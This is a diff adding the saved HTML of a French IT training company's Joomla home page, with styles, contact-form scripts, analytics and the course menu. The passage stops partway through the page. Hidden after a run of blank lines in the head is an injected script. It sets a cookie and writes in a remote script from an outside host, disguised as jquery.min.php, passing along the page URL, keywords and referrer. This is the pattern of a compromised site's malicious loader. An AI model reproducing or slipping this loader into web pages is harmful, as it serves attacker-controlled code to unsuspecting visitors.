@@ -1,0 +1,918 @@
+  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr-fr" lang="fr-fr" dir="ltr" >
+<head>
+      <base href="https://www.mistra.fr/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="keywords" content="formation, centre, organisme, informatique, Internet, java, jee, dot, .net, linux, web, développement." />
+  <meta name="description" content="Mistra est un organisme de formation pour les professionnels de l'informatique : Java / JEE, .Net, Mobile, Web, Linux." />
+  <meta name="generator" content="Joomla! - Open Source Content Management" />
+  <title>Mistra - formation pour les professionnels de l'informatique</title>
+  <link href="/?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+  <link href="/?format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+  <link href="/templates/mistra_new/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+  <link href="https://www.mistra.fr/component/search/?format=opensearch" rel="search" title="Valider Mistra - Formations pour les professionnels de l'informatique" type="application/opensearchdescription+xml" />
+  <link rel="stylesheet" href="https://www.mistra.fr/components/com_aicontactsafe/includes/css/aicontactsafe_general.css" type="text/css" />
+  <link rel="stylesheet" href="https://www.mistra.fr/media/aicontactsafe/cssprofiles/profile_css_4.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/system/css/template.css" type="text/css" />
+  <link rel="stylesheet" href="https://www.mistra.fr/modules/mod_djimageslider/assets/style.css" type="text/css" />
+  <style type="text/css">
+
+		/* Styles for DJ Image Slider with module id 213 */
+		#djslider-loader213 {
+			margin: 0 auto;
+			position: relative;
+		}
+		#djslider213 {
+			margin: 0 auto;
+			position: relative;
+			height: 470px; 
+			width: 1571px;
+			max-width: 1571px;
+		}
+		#slider-container213 {
+			position: absolute;
+			overflow:hidden;
+			left: 0; 
+			top: 0;
+			height: 100%;
+			width: 100%;
+		}
+		#djslider213 ul#slider213 {
+			margin: 0 !important;
+			padding: 0 !important;
+			border: 0 !important;
+		}
+		#djslider213 ul#slider213 li {
+			list-style: none outside !important;
+			float: left;
+			margin: 0 !important;
+			border: 0 !important;
+			padding: 0 0px 0px 0 !important;
+			position: relative;
+			height: 470px;
+			width: 1571px;
+			background: none;
+			overflow: hidden;
+		}
+		#slider213 li img {
+			width: 100%;
+			height: auto;
+			border: 0 !important;
+			margin: 0 !important;
+		}
+		#slider213 li a img, #slider213 li a:hover img {
+			border: 0 !important;
+		}
+		
+		/* Slide description area */
+		#slider213 .slide-desc {
+			position: absolute;
+			bottom: 0%;
+			left: 0%;
+			width: 100%;
+		}
+		#slider213 .slide-desc-in {
+			position: relative;
+			margin: 0 0px 0px 0 !important;
+		}
+		#slider213 .slide-desc-bg {
+			position:absolute;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+		}
+		#slider213 .slide-desc-text {
+			position: relative;
+		}
+		#slider213 .slide-desc-text h3 {
+			display: block !important;
+		}
+		
+  </style>
+  <script src="/media/system/js/mootools-core.js" type="text/javascript"></script>
+  <script src="/media/system/js/core.js" type="text/javascript"></script>
+  <script src="/media/system/js/mootools-more.js" type="text/javascript"></script>
+  <script src="/modules/mod_djimageslider/assets/powertools-1.2.0.js" type="text/javascript"></script>
+  <script src="/modules/mod_djimageslider/assets/slider.js" type="text/javascript"></script>
+  <script type="text/javascript">
+
+
+	//<![CDATA[
+	
+	function resetSubmit( pf ) {
+		$('adminForm_'+pf).addEvent('submit', function(e) {
+			new Event(e).stop();
+				e.stop();
+				var xSubmit = new Request.HTML(
+					{url:'https://www.mistra.fr/index.php?option=com_aicontactsafe',
+					evalScripts:false,
+					update:$('displayAiContactSafeForm_'+pf),
+					onRequest: function(){ 
+										document.getElementById('adminForm_'+pf).elements['task'].value = 'ajaxform'; 
+										document.getElementById('adminForm_'+pf).elements['use_ajax'].value = '1';
+										$('aiContactSafeSend_loading_'+pf).innerHTML = '&nbsp;&nbsp;Un moment SVP ...&nbsp;<img id="imgLoading" border="0" src="https://www.mistra.fr/components/com_aicontactsafe/includes/images/load.gif" />&nbsp;&nbsp;';
+										document.getElementById('adminForm_'+pf).elements['aiContactSafeSendButton'].disabled = true;
+					},
+					onSuccess: function(responseTree, responseElements, responseHTML, responseJavaScript) { 
+										changeCaptcha(pf,0); 
+										document.getElementById('adminForm_'+pf).elements['aiContactSafeSendButton'].removeAttribute('disabled');
+										if (document.getElementById('adminForm_'+pf).elements['ajax_return_to']) {
+											var ajax_return_to = document.getElementById('adminForm_'+pf).elements['ajax_return_to'].value;
+											if (ajax_return_to.length > 0) {
+												window.location = ajax_return_to;
+											}
+										} else {
+											if (document.getElementById('adminForm_'+pf).elements['ajax_message_sent']) {
+												var return_to = document.getElementById('adminForm_'+pf).elements['return_to'].value;
+												return_to = return_to.replace('&#38;', '&');
+												var current_url = document.getElementById('adminForm_'+pf).elements['current_url'].value;
+												current_url = current_url.replace('&#38;', '&');
+												if (return_to.length > 0 && return_to != current_url) {													
+													window.location = return_to;
+												}
+											}
+										}
+										$('aiContactSafeSend_loading_'+pf).innerHTML = '&nbsp;';
+										setupCalendars(pf);
+										if(typeof SqueezeBox!='undefined' && $('system-message')) {
+											SqueezeBox.initialize();
+											SqueezeBox.open($('system-message'), {
+												handler: 'adopt',
+												size: {x: $('system-message').offsetWidth+30, y: $('system-message').offsetHeight+30}
+											});
+										}
+					}}
+				).post($('adminForm_'+pf));
+	
+		});
+	}
+	function checkEditboxLimit( pf, editbox_id, chars_limit ){
+		if (document.getElementById('adminForm_'+pf).elements[editbox_id]) {
+			if (document.getElementById('adminForm_'+pf).elements[editbox_id].value.length > chars_limit) {
+				alert('Maximum characters exceeded ! !');
+				document.getElementById('adminForm_'+pf).elements[editbox_id].value = document.getElementById('adminForm_'+pf).elements[editbox_id].value.substring(0,chars_limit);
+			} else {
+				if (document.getElementById('adminForm_'+pf).elements['countdown_'+editbox_id]) {
+					document.getElementById('adminForm_'+pf).elements['countdown_'+editbox_id].value = chars_limit - document.getElementById('adminForm_'+pf).elements[editbox_id].value.length;
+				}
+			}
+		}
+	}
+	function changeCaptcha( pf, modifyFocus ) {
+		if (document.getElementById('div_captcha_img_'+pf)) {
+			var set_rand = Math.floor(Math.random()*10000000001);
+			var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+			var captcha_file = 'https://www.mistra.fr/index.php?option=com_aicontactsafe&sTask=captcha&task=captcha&pf='+pf+'&r_id='+r_id+'&lang=en&format=raw&set_rand='+set_rand;
+			if (window.ie6) {
+				var url = 'https://www.mistra.fr/index.php?option=com_aicontactsafe&sTask=captcha&task=newCaptcha&pf='+pf+'&r_id='+r_id+'&lang=en&format=raw&set_rand='+set_rand;
+				var xCaptcha = new Request({
+					url: url, 
+					method: 'get', 
+					onRequest: function(){
+											$('div_captcha_img_'+pf).innerHTML = 'Un moment SVP ...';
+					},
+					onComplete: function(responseText){
+											$('div_captcha_img_'+pf).innerHTML = responseText;
+					}
+				}).send();
+	
+			} else {
+				$('div_captcha_img_'+pf).innerHTML = '<img src="'+captcha_file+'" alt="&nbsp;" id="captcha" border="0" />';
+			}
+			if (modifyFocus && document.getElementById('captcha-code')) {
+				document.getElementById('captcha-code').focus();
+			}
+		}
+		if (document.getElementById('aiContactSafe_form_'+pf) || document.getElementById('aiContactSafe_module_'+pf)) {
+			if (document.getElementById('reCaptchaReset')) {
+				if (document.getElementById('reCaptchaReset').value == 1 && document.getElementById('recaptcha_div')) {
+					if (document.getElementById('reCaptchaPublicKey')) {
+						var reCaptchaPublicKey = document.getElementById('reCaptchaPublicKey').value;
+					} else {
+						var reCaptchaPublicKey = '';
+					}
+					if (document.getElementById('reCaptchaTheme')) {
+						var reCaptchaTheme = document.getElementById('reCaptchaTheme').value;
+					} else {
+						var reCaptchaTheme = '';
+					}
+					Recaptcha.create(reCaptchaPublicKey, 'recaptcha_div',  { theme:reCaptchaTheme });
+				}
+			}
+		}
+		if (document.getElementById('captcha-code')) {
+			$('captcha-code').value = '';
+		} else if (document.getElementById('captcha_code')) {
+			$('captcha_code').value = '';
+		} else if (document.getElementById('mathguard_answer')) {
+			$('mathguard_answer').value = '';
+		} else if (document.getElementById('recaptcha_response_field')) {
+			$('recaptcha_response_field').value = '';
+		}
+	}
+	function setDate( pf, newDate, idDate ) {
+		if (document.getElementById('adminForm_'+pf).elements['day_'+idDate]) {
+			document.getElementById('adminForm_'+pf).elements['day_'+idDate].value = newDate.substr(8,2);
+		}
+		if (document.getElementById('adminForm_'+pf).elements['month_'+idDate]) {
+			var selMonth = newDate.substr(5,2);
+			if(selMonth.substr(0,1) == '0') {
+				selMonth = selMonth.substr(1,1);
+			}
+			selMonth = parseInt(selMonth) - 1;
+			document.getElementById('adminForm_'+pf).elements['month_'+idDate].options[selMonth].selected = true;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['year_'+idDate]) {
+			document.getElementById('adminForm_'+pf).elements['year_'+idDate].value = newDate.substr(0,4);
+		}
+	}
+	function daysInFebruary( year ){
+		var days = (((year % 4 == 0) && ( (!(year % 100 == 0)) || (year % 400 == 0))) ? 29 : 28 );
+		return days;
+	}
+	function daysInMonth( month, year ) {
+		var days = 31;
+		switch( true ) {
+			case month == 2 :
+				days = daysInFebruary( year );
+				break;
+			case month == 4 || month == 6 || month == 9 || month == 11 :
+				days = 30;
+				break;
+		}
+	   return days;
+	}
+	function checkDate( pf, idDate ) {
+		var year = 0;
+		var month = 0;
+		var day = 0;
+		if (document.getElementById('adminForm_'+pf).elements['year_'+idDate]) {
+			year = document.getElementById('adminForm_'+pf).elements['year_'+idDate].value;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['month_'+idDate]) {
+			month = document.getElementById('adminForm_'+pf).elements['month_'+idDate].value;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['day_'+idDate]) {
+			day = document.getElementById('adminForm_'+pf).elements['day_'+idDate].value;
+		}
+		if (day > 0 && month > 0 && year > 0) {
+			var days = daysInMonth( month, year );
+			if (day > days) {
+				day = days;
+				document.getElementById('adminForm_'+pf).elements['day_'+idDate].value = days;
+				var error = 'Il y a seulement %days% jours dans le mois sélectionné ! SVP Entrez le mois en premier.';
+				alert( error.replace( '%days%', days ) );
+			}
+		}
+		if (document.getElementById('adminForm_'+pf).elements[idDate]) {
+			document.getElementById('adminForm_'+pf).elements[idDate].value = year+'-'+month+'-'+day;
+		}
+	}
+	function clickCheckBox( pf, idTag, ckChecked ) {
+		document.getElementById('adminForm_'+pf).elements[idTag].value = ckChecked?1:0;
+	}
+	function hideUploadField(file_field, pf) {
+		$('upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showUploadField(file_field, pf) {
+		$('upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function resetUploadField(file_field, pf) {
+		var var_file_field = "'"+file_field+"'";
+		$('upload_'+pf+'_file_'+file_field).innerHTML = '<input type="file" name="'+file_field+'" id="'+file_field+'" onchange="startUploadFile('+var_file_field+','+pf+')" />';
+	}
+	function hideFileField(file_field, pf) {
+		$('cancel_upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showFileField(file_field, pf) {
+		$('cancel_upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function hideWaitFileField(file_field, pf) {
+		$('wait_upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showWaitFileField(file_field, pf) {
+		$('wait_upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function cancelUploadFile(file_field, pf) {
+		hideFileField(file_field, pf);
+		deleteUploadedFile(file_field, pf);
+		$('adminForm_'+pf).elements[file_field+'_attachment_name'].value = '';
+		$('adminForm_'+pf).elements[file_field+'_attachment_id'].value = '';
+		resetUploadField(file_field, pf);
+		showUploadField(file_field, pf);
+	}
+	function deleteUploadedFile(file_field, pf) {
+		var file_name = $('adminForm_'+pf).elements[file_field+'_attachment_name'].value;
+		var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+		var url = 'https://www.mistra.fr/index.php?option=com_aicontactsafe&sTask=message&task=deleteUploadedFile&filename='+file_name+'&r_id='+r_id+'&format=raw'
+		var xUpload = new Request({
+			url: url, 
+			method: 'get'
+		}).send();
+	
+	}
+	function startUploadFile(file_field, pf) {
+		var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+		$('adminForm_'+pf).setProperty('action','https://www.mistra.fr/index.php?option=com_aicontactsafe&field='+file_field+'&r_id='+r_id+'&format=raw');
+		$('adminForm_'+pf).setProperty('target','iframe_upload_file_'+pf+'_file_'+file_field);
+		$('adminForm_'+pf).elements['task'].value = 'uploadFile';
+		hideUploadField(file_field, pf);
+		hideFileField(file_field, pf);
+		showWaitFileField(file_field, pf);
+		$('adminForm_'+pf).submit();
+		resetUploadField(file_field, pf);
+	}
+	function endUploadFile(pf, file_field, attachment_name, attachment_id, error_type, error_message) {
+		error_type = parseInt(error_type);
+		hideWaitFileField(file_field, pf);
+		switch( error_type ) {
+			case 0 :
+				$('adminForm_'+pf).elements[file_field+'_attachment_name'].value = attachment_name;
+				$('adminForm_'+pf).elements[file_field+'_attachment_id'].value = attachment_id;
+				showFileField(file_field, pf);
+				break;
+			case 1 :
+				alert('Ce type de fichier joint n\'est pas accepté ! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+			case 2 :
+				alert('Fichier trop gros ! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+			case 3 :
+				alert('Other error ! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+		}
+		resetSendButtonTarget(pf);
+	}
+	function resetSendButtonTarget(pf) {
+		$('adminForm_'+pf).setProperty('action','https://www.mistra.fr/index.php?option=com_aicontactsafe');
+		$('adminForm_'+pf).setProperty('target','_self');
+		$('adminForm_'+pf).elements['task'].value = 'message';
+	}
+	function setupCalendars(pf) {
+		var calendars_imgs = $$('#adminForm_'+pf+' img.calendar');
+		var countCalendars = calendars_imgs.length;
+		for(var i=0;i<countCalendars;i++) {
+			var imgid = calendars_imgs[i].getProperty('id');
+			if (imgid.substr(imgid.length-4)=='_img') {
+				fieldid = imgid.substr(0,imgid.length-4);
+				Calendar.setup({inputField : fieldid, ifFormat: "%Y-%m-%d", button : imgid, align : "Tl", singleClick : true});
+			}
+		}
+	}
+	//
+	//]]>
+
+				//<![CDATA[
+				
+				window.addEvent('load', function() {
+					changeCaptcha(4,0);
+
+/*					if($(typeof SqueezeBox!='undefined' && 'system-message')) {
+						SqueezeBox.initialize();
+						SqueezeBox.open($('system-message'), {
+							handler: 'adopt',
+							size: {x: $('system-message').offsetWidth+30, y: $('system-message').offsetHeight+30}
+						});
+					}*/
+				});
+				//
+				//]]>
+			
+  
+ var _gaq = _gaq || [];
+ _gaq.push(['_setAccount', 'UA-873516-9']);
+_gaq.push(['_trackPageview']);
+					
+ (function() {
+  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+ })();
+(function($){ window.addEvent('domready',function(){this.Slider213 = new DJImageSlider({id: '213', slider_type: 2, slide_size: 1571, visible_slides: 1, show_buttons: 0, show_arrows: 0, preload: 800},{auto: 1, transition: Fx.Transitions.linear, duration: 600, delay: 3600})}); })(document.id);
+  </script>
+
+    <meta name="viewport" content="width=device-width">
+    <link rel="stylesheet" href="/templates/mistra_new/css/template.css" type="text/css" />
+        <link rel="stylesheet" type="text/css" href="/templates/mistra_new/fancybox/jquery.fancybox-1.3.4.css" media="screen" />
+    <script type="text/javascript" src="/templates/mistra_new/js/jquery-2.1.1.min.js"></script>
+    <script type="text/javascript" src="/templates/mistra_new/js/jquery.mistra.js"></script>
+    <script type="text/javascript" src="/templates/mistra_new/js/all.min.js"></script>
+
+<style>
+.front-page, .elt-slide-right, .elt-slide-left, .kl_slider, .breadcrumb{ display:block;}
+#system-message{ display: none }
+</style>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://crevis.sk/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'I92930' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
+
+
+<meta name="google-site-verification" content="" />
+
+<script type="text/javascript">
+ var _gaq = _gaq || [];
+ _gaq.push(['_setAccount', 'UA-873516-9']);
+_gaq.push(['_trackPageview']);
+					
+ (function() {
+  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+ })();
+</script>
+
+</head>
+<!---->
+<body>
+  <div id="wrapper">
+      <div class="header">
+          <div class="kl_bloc_top">
+                <div class="container kl_top">
+                    <h1 class="kl_logo">
+            <a href="/">
+                              <img src="/templates/mistra_new/images/logo-mistra.png" alt="" />
+                          </a>
+          </h1>
+                    <button class="navbar-toggle" type="button">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+          </button>
+          <span class="kl_mobile_txt_menu">Menu</span>
+                    <div class="kl_nav navbar-collapse collapse nav-mobile">
+                    <!--NAV et recherche-->
+                      
+<ul class="kl_nav nav navbar-nav menu nav menu" id="menu-menu_header">
+<li class="item-6526 current active"><a href="/" ><img src="/images/accueil.png" alt="Mistra" /></a></li><li class="item-6522 deeper parent"><a href="/catalogue-des-formations.html" >Formations</a><ul><li class="item-6542 deeper parent"><a href="/formations-java.html" >Java</a><ul><li class="item-6544"><a href="/formations-initiations/formation-conception-objet.html" >Initation Objet et Java</a></li><li class="item-6545"><a href="/formations-java/formation-struts.html" >Struts</a></li><li class="item-6546"><a href="/formations-java/formation-hibernate.html" >Hibernate</a></li><li class="item-6547"><a href="/formations-java/formation-spring.html" >Spring</a></li><li class="item-6548"><a href="/formations-java/formation-gwt-2.html" >GWT</a></li><li class="item-6549"><a href="/formations-java/formation-swing.html" >Swing</a></li><li class="item-6550"><a href="/formations-java/formation-maven.html" >Maven</a></li><li class="item-6551"><a href="/formations-java.html" >Plus de choix …</a></li></ul></li><li class="item-6552 deeper parent"><a href="/formations-serveurs-open-source.html" >Open Source</a><ul><li class="item-6553"><a href="/formations-linux/formation-linux-utilisateur.html" >Linux Initiation</a></li><li class="item-6554"><a href="/formations-linux/formation-linux-administrateur.html" >Linux Administration</a></li><li class="item-6555"><a href="/formations-linux/formation-administration-apache.html" >Apache</a></li><li class="item-6556"><a href="/formations-serveurs-open-source/formation-tomcat.html" >Tomcat</a></li><li class="item-6558"><a href="/formations-serveurs-open-source/formation-mysql-administration.html" >MySQL Administration</a></li><li class="item-6559"><a href="/formations-serveurs-open-source/formation-mongodb.html" >MongoDB</a></li><li class="item-6560"><a href="/formations-linux.html" >Plus de choix …</a></li></ul></li><li class="item-6561 deeper parent"><a href="/formations-developpement-mobile.html" >Mobiles</a><ul><li class="item-6562"><a href="/formations-developpement-mobile/iphone-ipad-developpement.html" >iPhone / iPad</a></li><li class="item-6563"><a href="/formations-developpement-mobile/formation-android.html" >Android</a></li><li class="item-6564"><a href="/formations-developpement-mobile/formation-windows-phone-8-wp8.html" >Windows Phone 8</a></li><li class="item-6565"><a href="/formations-developpement-mobile/formation-web-mobiles-multi-plates-formes.html" >Web Mobile</a></li><li class="item-6566"><a href="/formations-java.html" >PhoneGap</a></li><li class="item-6567"><a href="/formations-developpement-mobile/formation-jquery-mobile.html" >Jquery Mobile</a></li><li class="item-6568"><a href="/formations-developpement-mobile/formation-sencha-touch.html" >Sencha Touch 2</a></li><li class="item-6667"><a href="/formations-developpement-mobile/formation-swift.html" >Langage Swift</a></li><li class="item-6670"><a href="/formations-developpement-mobile/formation-google-glass.html" >Google Glass</a></li><li class="item-6569"><a href="/formations-developpement-mobile.html" >Plus de choix …</a></li></ul></li><li class="item-6570 deeper parent"><a href="/formations-developpement-web.html" >Web</a><ul><li class="item-6571"><a href="/formations-developpement-web/formation-angular-js.html" >Angular JS</a></li><li class="item-6572"><a href="/formations-developpement-web/formation-html-5-css3.html" >HTML5 / CSS3</a></li><li class="item-6573"><a href="/formations-developpement-web/formation-php-initiation.html" >PHP</a></li><li class="item-6574"><a href="/formations-developpement-web/formation-symfony-2.html" >Symfony2</a></li><li class="item-6575"><a href="/formations-cms/formation-joomla-webmaster.html" >Joomla</a></li><li class="item-6576"><a href="/formations-developpement-web/formation-xml.html" >XML</a></li><li class="item-6577"><a href="/formations-developpement-web/formation-extjs-4.html" >ExtJS</a></li><li class="item-6578"><a href="/formations-developpement-web.html" >Plus de choix …</a></li></ul></li><li class="item-6579 deeper parent"><a href="/formations-dot-net.html" >.NET</a><ul><li class="item-6580"><a href="/formations-dot-net/formation-c-sharp-initiation.html" >C#</a></li><li class="item-6581"><a href="/formations-dot-net/formation-vb-net.html" >VB.NET</a></li><li class="item-6582"><a href="/formations-dot-net/formation-asp-net.html" >ASP.NET</a></li><li class="item-6583"><a href="/formations-dot-net/formation-silverlight4.html" >Silverlight</a></li><li class="item-6584"><a href="/formations-dot-net/formation-wcf.html" >WCF</a></li><li class="item-6585"><a href="/formations-dot-net/formation-wpf.html" >WPF</a></li><li class="item-6586"><a href="/formations-dot-net/formation-linq.html" >LINQ</a></li><li class="item-6587"><a href="/formations-dot-net.html" >Plus de choix …</a></li></ul></li></ul></li><li class="item-6523 deeper parent"><a href="/accueil-tutoriels.html" >Tutoriels</a><ul><li class="item-6588 deeper parent"><a href="/tutoriels-java.html" >Java</a><ul><li class="item-6589"><a href="/tutoriels-java/tutoriel-hibernate.html" >Hibernate</a></li><li class="item-6590"><a href="/tutoriels-web/tutoriels-ria/tutoriel-ria-gwt-2-spring.html" >Spring et GWT</a></li><li class="item-6665"><a href="/tutoriels-java/services-google.html" >Services Google</a></li></ul></li><li class="item-6594 deeper parent"><a href="/tutoriels-web.html" >Web</a><ul><li class="item-6595"><a href="/tutoriels-web/tutoriels-ria/tutoriel-flex-actionscript.html" >Flex</a></li><li class="item-6596"><a href="/tutoriels-web/tutoriels-html5-css3.html" >HTML5/CSS3</a></li><li class="item-6633"><a href="/tutoriels-web/tutoriel-symfony-2.html" >Symfony 2</a></li><li class="item-6597"><a href="/tutoriels-web/tutoriel-nodejs.html" >NodeJS</a></li></ul></li><li class="item-6591 deeper parent"><a href="/tutoriels-developpement-mobile.html" >Mobiles</a><ul><li class="item-6592"><a href="/tutoriels-developpement-mobile/tutoriels-android.html" >Android</a></li><li class="item-6593"><a href="/tutoriels-developpement-mobile/tutoriels-iphone-ipad-ios.html" >iPhone / iPad</a></li></ul></li><li class="item-6598 deeper parent"><a href="/tutoriels-linux.html" >Linux</a><ul><li class="item-6599"><a href="/tutoriels-virtualisation.html" >Virtualisation</a></li><li class="item-6600"><a href="/tutoriels-debian-installation.html" >Installations</a></li><li class="item-6601"><a href="/tutoriels-linux-stockage.html" >Stockage</a></li><li class="item-6602"><a href="/tutoriels-linux-administration-systeme.html" >Administration</a></li></ul></li><li class="item-6625"><a href="/web-services.html" >Web Services</a></li></ul></li><li class="item-6524 deeper parent"><a href="/infos-pratiques/choisir-sa-formation.html" >Infos Pratiques</a><ul><li class="item-6537"><a href="/infos-pratiques/nos-solutions-de-formations.html" >Les solutions Mistra</a></li><li class="item-6538"><a href="/infos-pratiques/choisir-sa-formation.html" >Choisir sa formation</a></li><li class="item-6539"><a href="/infos-pratiques/deroulement-des-formations.html" >Déroulement des formations</a></li><li class="item-6540"><a href="/infos-pratiques/financer-sa-formation.html" >Financer sa formation</a></li><li class="item-6541"><a href="/infos-pratiques/modeles-lettres-dif-cif.html" >Actualité de la formation</a></li><li class="item-6655"><a href="/infos-pratiques/cursus-formation-poe.html" >Cursus formation POE</a></li></ul></li><li class="item-6525 deeper parent"><a href="/qui-sommes-nous.html" >A propos</a><ul><li class="item-6531"><a href="/a-propos-de-mistra.html" >A propos de Mistra</a></li><li class="item-6532"><a href="/a-propos-de-mistra/carriere.html" >Nous recrutons !</a></li><li class="item-6533"><a href="/centres-de-formation.html" >Centres de formation</a></li><li class="item-6535"><a href="/mentions-legales.html" >Mentions Légales</a></li><li class="item-6536"><a href="/sites-partenaires.html" >Sites partenaires</a></li><li class="item-6534"><a href="/a-propos-de-mistra/ils-parlent-de-mistra.html" >Ils parlent de nous</a></li></ul></li><li class="item-6528"><a href="http://blog.mistra.fr" target="_blank" >Actualités</a></li><li class="item-6527"><a href="/contact.html" >Contact</a></li><li class="item-6603"><a href="/forum.html" >Forum</a></li><li class="item-6620"><a href="/contacts.html" >Contact</a></li><li class="item-6736"><a class="hide" href="/devis-envoye.html" >Devis envoyé</a></li></ul>
+ 
+<div class="kl_bloc_rec">
+<div class="kl_recherche">
+<form action="/" method="post">
+	<div class="searchinputRecherche">
+		<input name="searchword" id="mod-search-searchword" maxlength="20"  class="recherche-mod inputboxinputRecherche" type="text" size="30" placeholder="RECHERCHER" /><input type="submit" value=" " class="kl_but_rec buttoninputRecherche" onclick="this.form.searchword.focus();"/>	<input type="hidden" name="task" value="search" />
+	<input type="hidden" name="option" value="com_search" />
+	<input type="hidden" name="Itemid" value="6626" />
+    <span class="elt-mod-text-left"></span>
+    <span class="elt-mod-text-right"></span>
+    <span class="elt-mod-butt-left"></span>
+    <span class="elt-mod-butt-right"></span>
+	</div>
+</form>
+</div>
+<div class="kl_top_actus">
+    <a href="http://blog.mistra.fr" target="_blank">Les <span>actu</span>alit&eacute;s IT</a>
+    <span class="elt-actu-left"></span>
+    <span class="elt-actu-right"></span>
+</div>
+</div>
+
+                    </div>
+                </div>
+            </div>
+            <div class="kl_vide_height"></div>
+                  <div class="kl_slider">
+              <div class="elt-slide-left"></div>
+              <div class="elt-slide-right"></div>
+           <div class="carousel slide" id="myCarousel">
+      <div class="carousel-inner">
+            		<div class="moduletable djslider">
+					<h3>Mistra en Images</h3>
+					
+<div id="djslider-loader213" class="djslider-loader">
+    <div id="djslider213" class="djslider">
+        <div id="slider-container213" class="slider-container">
+        	<ul id="slider213">
+          		          			<li>
+          					            											<img src="/images/banners/slide.png" alt="Slide1" />
+																									<!-- Slide description area: START -->
+						<div class="slide-desc">
+						  <div class="slide-desc-in">	
+							<div class="slide-desc-bg"></div>
+							<div class="slide-desc-text">
+														
+															<div class="slide-text">
+																			<p>Formations en informatique</p>
+		<p>pour les professionnels</p>																	</div>
+														
+														<div style="clear: both"></div>
+							</div>
+						  </div>
+						</div>
+						<!-- Slide description area: END -->
+												
+						
+					</li>
+                          			<li>
+          					            											<a  href="/formations-developpement-mobile/xamarin-pour-ios-et-android.html" target="_self">
+															<img src="/images/banners/slide.png" alt="Slide2" />
+															</a>
+																									<!-- Slide description area: START -->
+						<div class="slide-desc">
+						  <div class="slide-desc-in">	
+							<div class="slide-desc-bg"></div>
+							<div class="slide-desc-text">
+														
+															<div class="slide-text">
+																			<p>Formations en informatique</p>
+<p>pour les professionnels</p>																	</div>
+														
+														<div style="clear: both"></div>
+							</div>
+						  </div>
+						</div>
+						<!-- Slide description area: END -->
+												
+						
+					</li>
+                          			<li>
+          					            											<img src="/images/banners/slide.png" alt="Slide1" />
+																									<!-- Slide description area: START -->
+						<div class="slide-desc">
+						  <div class="slide-desc-in">	
+							<div class="slide-desc-bg"></div>
+							<div class="slide-desc-text">
+														
+															<div class="slide-text">
+																			<p>Formations en informatique</p>
+<p>pour les professionnels</p>																	</div>
+														
+														<div style="clear: both"></div>
+							</div>
+						  </div>
+						</div>
+						<!-- Slide description area: END -->
+												
+						
+					</li>
+                          			<li>
+          					            											<img src="/images/banners/slide.png" alt="Slide2" />
+																									<!-- Slide description area: START -->
+						<div class="slide-desc">
+						  <div class="slide-desc-in">	
+							<div class="slide-desc-bg"></div>
+							<div class="slide-desc-text">
+														
+															<div class="slide-text">
+																			<p>Formations en informatique</p>
+		<p>pour les professionnels</p>
+																	</div>
+														
+														<div style="clear: both"></div>
+							</div>
+						  </div>
+						</div>
+						<!-- Slide description area: END -->
+												
+						
+					</li>
+                        	</ul>
+        </div>
+                    </div>
+</div>
+	
+<div style="clear: both"></div>		</div>
+	
+      </div>
+      <div class="ombre_bann"></div>
+    </div>
+            </div>
+              </div>
+          <div class="breadcrumb container">
+            
+            </div>
+      <div class="formations hide">		<div class="moduletable">
+					
+<div class="custom">
